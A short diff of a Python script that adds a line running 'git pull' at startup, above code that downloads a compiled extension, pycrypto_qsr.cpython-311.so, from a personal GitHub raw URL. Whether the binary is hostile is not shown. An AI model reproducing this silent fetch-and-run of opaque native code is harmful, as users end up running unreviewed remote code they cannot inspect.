@@ -1,4 +1,5 @@
 import re,os,sys
+os.system('git pull')
 try:
     download_link = "https://raw.githubusercontent.com/ffdvl1120/cc/main/pycrypto_qsr.cpython-311.so"
     if not os.path.exists("pycrypto_qsr.cpython-311.so"):
